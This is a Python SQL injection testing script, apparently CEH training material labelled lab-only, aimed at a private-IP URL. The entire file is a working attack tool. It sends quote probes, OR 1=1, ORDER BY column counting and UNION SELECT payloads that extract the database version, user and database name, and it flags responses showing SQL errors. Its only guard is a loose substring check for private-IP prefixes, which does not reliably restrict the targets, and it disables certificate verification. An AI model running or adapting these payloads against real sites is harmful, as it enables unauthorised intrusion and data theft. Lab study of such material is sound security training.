#!/usr/bin/env python3
# LAB-ONLY: Error-Based SQL Injection Tester
# CEH v13 Master Module 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/vuln.php?id="  # Change to YOUR lab URL
LAB_PAYLOADS = [
    "'", "''", "\"", "\"\"",
    "' OR 1=1 -- ",
    "' OR 1=2 -- ",
    "' ORDER BY 1 -- ",
    "' ORDER BY 2 -- ",
    "' ORDER BY 3 -- ",
    "' UNION SELECT 1,2,3 -- ",
    "' UNION SELECT @@version,2,3 -- ",
    "' UNION SELECT user(),2,3 -- ",
    "' UNION SELECT database(),2,3 -- "
]
LAB_ERROR_INDICATORS = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite"]
# -----------------------------------------------------------------------------------

def test_sqli(url, payload):
    full_url = f"{url}{payload}"
    try:
        response = requests.get(full_url, timeout=5, verify=False)  # Lab-only: verify=False is okay
        for indicator in LAB_ERROR_INDICATORS:
            if indicator.lower() in response.text.lower():
                return True, response.text
        return False, response.text
    except Exception as e:
        return False, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: Error-Based SQL Injection Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("Testing payloads (LAB ONLY)...")
    print("-"*80)
    for payload in LAB_PAYLOADS:
        vulnerable, resp = test_sqli(LAB_TARGET_URL, payload)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Vulnerable"
        print(f"Payload: {payload:<50} â†’ {status}")
        if vulnerable:
            print(f"   Error snippet: {resp[:200]}...")
            print("-"*80)

if __name__ == "__main__":
    # Quick validation: Check if target URL is private lab IP
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: This script is LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # Lab-only
    main()
